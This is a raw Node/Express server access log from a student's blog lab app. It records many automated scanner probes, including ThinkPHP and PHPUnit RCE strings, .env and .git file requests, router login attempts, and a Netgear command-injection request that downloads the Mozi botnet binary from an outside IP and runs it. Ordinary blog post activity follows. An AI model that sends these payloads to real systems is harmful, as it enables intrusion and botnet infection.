[0mGET //phpMyAdmin2/scripts/setup.php [33m404 [0m1.640 ms - 1434[0m
[0mGET //phpMyAds/scripts/setup.php [33m404 [0m0.953 ms - 1434[0m
[0mGET //phpm/scripts/setup.php [33m404 [0m0.878 ms - 1434[0m
[0mGET //phpmanager/scripts/setup.php [33m404 [0m0.880 ms - 1434[0m
[0mGET //phpmy-admin/scripts/setup.php [33m404 [0m0.863 ms - 1434[0m
[0mGET //phpmy/scripts/setup.php [33m404 [0m0.852 ms - 1434[0m
[0mGET //phpmyad-sys/scripts/setup.php [33m404 [0m0.849 ms - 1434[0m
[0mGET //phpmyad/scripts/setup.php [33m404 [0m0.816 ms - 1434[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m5.903 ms - 1434[0m
[0mGET //phpmyadmin2/scripts/setup.php [33m404 [0m0.897 ms - 1434[0m
[0mGET //pma/scripts/setup.php [33m404 [0m0.841 ms - 1434[0m
[0mGET //pma2005/scripts/setup.php [33m404 [0m0.833 ms - 1434[0m
[0mGET //scripts/setup.php [33m404 [0m0.857 ms - 1434[0m
[0mGET //sqladmin/scripts/setup.php [33m404 [0m0.834 ms - 1434[0m
[0mGET //sqlmanager/scripts/setup.php [33m404 [0m0.838 ms - 1434[0m
[0mGET //sqlweb/scripts/setup.php [33m404 [0m0.877 ms - 1434[0m
[0mGET //vhcs2/tools/pma/scripts/setup.php [33m404 [0m0.798 ms - 1434[0m
[0mGET //web/phpMyAdmin/scripts/setup.php [33m404 [0m0.883 ms - 1434[0m
[0mGET //webadmin/scripts/setup.php [33m404 [0m0.902 ms - 1434[0m
[0mGET //webdb/scripts/setup.php [33m404 [0m1.738 ms - 1434[0m
[0mGET //websql/scripts/setup.php [33m404 [0m0.930 ms - 1434[0m
[0mGET / [32m200 [0m0.915 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.806 ms - 1429[0m
[0mGET /.env [33m404 [0m0.849 ms - 1434[0m
[0mPOST / [33m404 [0m0.865 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.773 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.785 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.788 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.795 ms - 1429[0m
[0mGET / [32m200 [0m1.611 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.777 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.767 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m1.455 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.818 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.805 ms - 1429[0m
[0mGET /.env [33m404 [0m0.886 ms - 1434[0m
[0mPOST / [33m404 [0m0.969 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.777 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.764 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.759 ms - 1429[0m
[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m1.210 ms - 1434[0m
[0mGET /.env [33m404 [0m0.836 ms - 1434[0m
[0mGET / [32m200 [0m2.210 ms - 859[0m
[0mGET /v2/_catalog [33m404 [0m1.213 ms - 1434[0m
[0mGET /.git/config [33m404 [0m1.565 ms - 1434[0m
[0mGET / [32m200 [0m0.955 ms - 859[0m
[0mGET / [32m200 [0m0.878 ms - 859[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.908 ms - 1434[0m
[0mGET / [32m200 [0m0.879 ms - 859[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.872 ms - 859[0m
[0mGET / [32m200 [0m0.927 ms - 859[0m
[0mGET / [32m200 [0m0.883 ms - 859[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.881 ms - 859[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.868 ms - 1434[0m
[0mGET / [32m200 [0m1.048 ms - 859[0m
[0mGET / [32m200 [0m0.682 ms - 859[0m
[0mPOST /HNAP1/ [33m404 [0m0.838 ms - 1429[0m
[0mGET / [32m200 [0m1.035 ms - 859[0m
[0mGET / [32m200 [0m0.791 ms - 859[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.893 ms - 1429[0m
[0mGET / [32m200 [0m0.891 ms - 859[0m
[0mGET /.env [33m404 [0m0.846 ms - 1434[0m
[0mPOST / [33m404 [0m0.987 ms - 1429[0m
[0mGET /.env [33m404 [0m0.831 ms - 1434[0m
[0mPOST / [33m404 [0m0.922 ms - 1429[0m
[0mGET / [32m200 [0m0.895 ms - 859[0m
[0mGET /wp-includes/js/jquery/jquery.js [33m404 [0m0.875 ms - 1434[0m
[0mGET /administrator/help/en-GB/toc.json [33m404 [0m0.870 ms - 1434[0m
[0mGET /administrator/language/en-GB/install.xml [33m404 [0m0.845 ms - 1434[0m
[0mGET /plugins/system/debug/debug.xml [33m404 [0m0.924 ms - 1434[0m
[0mGET /administrator/ [33m404 [0m0.888 ms - 1434[0m
[0mGET /misc/ajax.js [33m404 [0m0.873 ms - 1434[0m
[0mGET / [32m200 [0m1.517 ms - 859[0m
[0mGET /admin/view/javascript/common.js [33m404 [0m0.861 ms - 1434[0m
[0mGET /admin/includes/general.js [33m404 [0m0.870 ms - 1434[0m
[0mGET /images/editor/separator.gif [33m404 [0m0.981 ms - 1434[0m
[0mGET /js/header-rollup-554.js [33m404 [0m1.068 ms - 1434[0m
[0mGET /vendor/phpunit/phpunit/build.xml [33m404 [0m0.816 ms - 1434[0m
[0mGET /fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media [33m404 [0m0.798 ms - 1434[0m
[0mGET /.env [33m404 [0m0.769 ms - 1434[0m
[0mGET / [32m200 [0m1.610 ms - 859[0m
[0mGET / [32m200 [0m0.915 ms - 859[0m
[0mHEAD /robots.txt [33m404 [0m0.917 ms - 1434[0m
[0mGET /boaform/admin/formLogin?username=ec8&psd=ec8 [33m404 [0m0.968 ms - 1434[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.906 ms - 1434[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.908 ms - 859[0m
[0mGET / [32m200 [0m0.911 ms - 859[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.879 ms - 859[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.893 ms - 1434[0m
[0mPOST /HNAP1/ [33m404 [0m0.798 ms - 1429[0m
[0mGET /boaform/admin/formLogin?username=ec8&psd=ec8 [33m404 [0m0.937 ms - 1434[0m
[0mGET / [32m200 [0m0.979 ms - 859[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.916 ms - 1429[0m
[0mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp [33m404 [0m5.465 ms - 1434[0m
[0mGET /.env [33m404 [0m0.826 ms - 1434[0m
[0mPOST / [33m404 [0m1.563 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.816 ms - 1429[0m
[0mGET / [32m200 [0m0.888 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.836 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.765 ms - 1429[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.912 ms - 1434[0m
[0mGET / [32m200 [0m0.913 ms - 859[0m
[0mGET / [32m200 [0m0.885 ms - 859[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.010 ms - 1429[0m
[0mGET /.env [33m404 [0m0.776 ms - 1434[0m
[0mPOST / [33m404 [0m0.946 ms - 1429[0m
[0mGET / [32m200 [0m0.926 ms - 859[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m0.931 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.763 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.762 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.807 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m1.408 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.783 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.799 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.767 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.781 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.749 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.797 ms - 1429[0m
[0mGET /boaform/admin/formLogin?username=user&psd=user [33m404 [0m1.529 ms - 1434[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.875 ms - 1434[0m
[0mGET /.env [33m404 [0m0.817 ms - 1434[0m
[0mPOST / [33m404 [0m1.567 ms - 1429[0m
[0mGET http://169.254.169.254/latest/meta-data/ [33m404 [0m1.004 ms - 1434[0m
[0mGET /clientaccesspolicy.xml [33m404 [0m1.633 ms - 1434[0m
[0mGET / [32m200 [0m0.866 ms - 859[0m
[0mGET /.env [33m404 [0m5.054 ms - 1434[0m
[0mPOST / [33m404 [0m0.802 ms - 1429[0m
[0mGET / [32m200 [0m0.929 ms - 859[0m
[0mGET / [32m200 [0m0.761 ms - 859[0m
[0mPOST /HNAP1/ [33m404 [0m0.778 ms - 1429[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.965 ms - 1434[0m
[0mHEAD /robots.txt [33m404 [0m0.934 ms - 1434[0m
[0mGET / [32m200 [0m1.002 ms - 859[0m
[0mGET / [32m200 [0m0.884 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.770 ms - 1429[0m
[0mGET /.env [33m404 [0m0.807 ms - 1434[0m
[0mPOST / [33m404 [0m0.811 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.772 ms - 1429[0m
[0mGET http://5.188.210.227/echo.php [33m404 [0m1.033 ms - 1434[0m
[0mGET / [32m200 [0m1.590 ms - 859[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.926 ms - 1434[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.871 ms - 859[0m
[0mHEAD /robots.txt [33m404 [0m0.907 ms - 1434[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.880 ms - 859[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.904 ms - 1434[0m
[0mGET / [32m200 [0m0.973 ms - 859[0m
[0mGET / [32m200 [0m1.762 ms - 859[0m
[0mGET /hudson [33m404 [0m0.924 ms - 1434[0m
[0mOPTIONS / [32m200 [0m0.304 ms - 8[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.914 ms - 1429[0m
[0mGET / [32m200 [0m0.898 ms - 859[0m
[0mGET / [32m200 [0m0.951 ms - 859[0m
[0mGET / [32m200 [0m0.931 ms - 859[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.770 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.813 ms - 1429[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.731 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.771 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.830 ms - 1429[0m
[0mGET /.env [33m404 [0m0.911 ms - 1434[0m
[0mPOST / [33m404 [0m1.014 ms - 1429[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.911 ms - 1434[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.846 ms - 859[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.834 ms - 859[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.902 ms - 1434[0m
[0mPOST /sns/message/receive [33m404 [0m0.871 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.813 ms - 1429[0m
[0mGET / [32m200 [0m0.882 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.825 ms - 1429[0m
[0mGET / [32m200 [0m1.582 ms - 859[0m
[0mGET / [32m200 [0m0.703 ms - 859[0m
[0mGET /CFIDE/administrator/ [33m404 [0m0.939 ms - 1434[0m
[0mPOST /sns/message/receive [33m404 [0m0.824 ms - 1429[0m
[0mGET /.env [33m404 [0m0.906 ms - 1434[0m
[0mPOST / [33m404 [0m0.986 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.765 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.771 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.763 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.768 ms - 1429[0m
[0mGET /.env [33m404 [0m0.872 ms - 1434[0m
[0mPOST / [33m404 [0m1.000 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.873 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.782 ms - 1429[0m
[0mGET / [32m200 [0m0.906 ms - 859[0m
[0mGET /favicon.ico [33m404 [0m1.592 ms - 1434[0m
[0mGET /robots.txt [33m404 [0m0.779 ms - 1434[0m
[0mGET / [32m200 [0m0.907 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.804 ms - 1429[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.938 ms - 1429[0m
[0mGET /.env [33m404 [0m0.883 ms - 1434[0m
[0mPOST / [33m404 [0m0.960 ms - 1429[0m
[0mGET /.env [33m404 [0m1.457 ms - 1434[0m
[0mPOST / [33m404 [0m0.849 ms - 1429[0m
[0mGET / [32m200 [0m0.957 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.804 ms - 1429[0m
[0mGET / [32m200 [0m0.909 ms - 859[0m
[0mGET / [32m200 [0m0.824 ms - 859[0m
[0mGET /index.php [33m404 [0m0.895 ms - 1434[0m
[0mGET /phpmyadmin/index.php [33m404 [0m0.935 ms - 1434[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.934 ms - 1434[0m
[0mGET /boaform/admin/formLogin?username=user&psd=user [33m404 [0m0.951 ms - 1434[0m
[0mGET /.env [33m404 [0m0.848 ms - 1434[0m
[0mPOST / [33m404 [0m0.962 ms - 1429[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.972 ms - 1429[0m
[0mPOST / [33m404 [0m1.047 ms - 1429[0m
[0mGET /.env [33m404 [0m0.867 ms - 1434[0m
[0mGET / [32m200 [0m0.905 ms - 859[0m
[0mGET /phpmyadmin/index.php?lang=en [33m404 [0m0.891 ms - 1434[0m
[0mGET http://169.254.169.254/latest/meta-data/ [33m404 [0m0.981 ms - 1434[0m
[0mGET / [32m200 [0m1.001 ms - 859[0m
[0mGET / [32m200 [0m0.914 ms - 859[0m
[0mGET /.env [33m404 [0m0.880 ms - 1434[0m
[0mPOST / [33m404 [0m1.667 ms - 1429[0m
[0mGET /phpmyadmin/index.php?lang=en [33m404 [0m0.933 ms - 1434[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.897 ms - 1434[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.909 ms - 1434[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.873 ms - 859[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.886 ms - 859[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.925 ms - 1434[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://60.213.121.185:41524/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.955 ms - 1434[0m
[0mGET / [32m200 [0m0.881 ms - 859[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.926 ms - 1429[0m
[0mGET / [32m200 [0m1.625 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.795 ms - 1429[0m
[0mGET / [32m200 [0m0.945 ms - 859[0m
[0mGET /webfig/ [33m404 [0m1.622 ms - 1434[0m
[0mPOST /sns/message/receive [33m404 [0m0.799 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.885 ms - 1429[0m
[0mGET / [32m200 [0m0.878 ms - 859[0m
Mongoose connected to mongodb://blogger:blogger@localhost:27017/blogger
[0mGET / [36m304 [0m14.103 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.954 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.007 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.231 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.352 ms - -[0m
[0mGET /favicon.ico [33m404 [0m1.982 ms - 1434[0m
[0mGET /blogs/add [32m200 [0m1.976 ms - 1537[0m
[0mGET /stylesheets/style.css [36m304 [0m1.014 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m2.602 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.867 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m3.144 ms - -[0m
{
  blogTitle: 'Lab Completed',
  blogText: 'This was a tough one, But i believe that everything is now in order.',
  author: 'Ryan Webster'
}
{
  _id: 5f84b286c5cf5f139510e632,
  author: 'Ryan Webster',
  blogTitle: 'Lab Completed',
  blogText: 'This was a tough one, But i believe that everything is now in order.',
  createdOn: 2020-10-12T19:46:14.212Z,
  __v: 0
}
[0mPOST /api/blogs/add [32m201 [0m40.612 ms - 215[0m
[0mPOST /blogs/add [36m302 [0m70.175 ms - 56[0m
Getting blogs list
[
  {
    _id: 5f83a8bc8fe0430563ed120e,
    author: 'Ryan Webster',
    blogTitle: 'Finally got everything working',
    blogText: 'or so I assume.....',
    createdOn: 2020-10-12T00:52:12.465Z,
    __v: 0
  },
  {
    _id: 5f84b286c5cf5f139510e632,
    author: 'Ryan Webster',
    blogTitle: 'Lab Completed',
    blogText: 'This was a tough one, But i believe that everything is now in order.',
    createdOn: 2020-10-12T19:46:14.212Z,
    __v: 0
  }
]
[0mGET /api/blogs [32m200 [0m21.686 ms - 307[0m
[0mGET /blogs [32m200 [0m26.605 ms - 3213[0m
[0mGET /stylesheets/style.css [36m304 [0m0.506 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.469 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.662 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.525 ms - -[0m
Finding blog post { blogid: '5f83a8bc8fe0430563ed120e' }
{
  _id: 5f83a8bc8fe0430563ed120e,
  author: 'Ryan Webster',
  blogTitle: 'Finally got everything working',
  blogText: 'or so I assume.....',
  createdOn: 2020-10-12T00:52:12.465Z,
  __v: 0
}
[0mGET /api/blogs/5f83a8bc8fe0430563ed120e [32m200 [0m10.429 ms - 183[0m
[0mGET /blogs/delete/5f83a8bc8fe0430563ed120e [32m200 [0m15.017 ms - 1664[0m
[0mGET /stylesheets/style.css [36m304 [0m0.493 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.513 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.761 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.768 ms - -[0m
Deleting book entry with id of 5f83a8bc8fe0430563ed120e
{}
(node:5013) DeprecationWarning: Mongoose: `findOneAndUpdate()` and `findOneAndDelete()` without the `useFindAndModify` option set to false are deprecated. See: https://mongoosejs.com/docs/deprecations.html#findandmodify
[0mDELETE /api/blogs/5f83a8bc8fe0430563ed120e [32m204 [0m12.058 ms - -[0m
[0mPOST /blogs/delete/5f83a8bc8fe0430563ed120e [36m302 [0m16.704 ms - 56[0m
Getting blogs list
[
  {
    _id: 5f84b286c5cf5f139510e632,
    author: 'Ryan Webster',
    blogTitle: 'Lab Completed',
    blogText: 'This was a tough one, But i believe that everything is now in order.',
    createdOn: 2020-10-12T19:46:14.212Z,
    __v: 0
  }
]
[0mGET /api/blogs [32m200 [0m2.715 ms - 170[0m
[0mGET /blogs [32m200 [0m6.379 ms - 2071[0m
[0mGET /stylesheets/style.css [36m304 [0m0.675 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.997 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.992 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m3.223 ms - -[0m
[0mGET / [36m304 [0m1.260 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.769 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.894 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.663 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.493 ms - -[0m
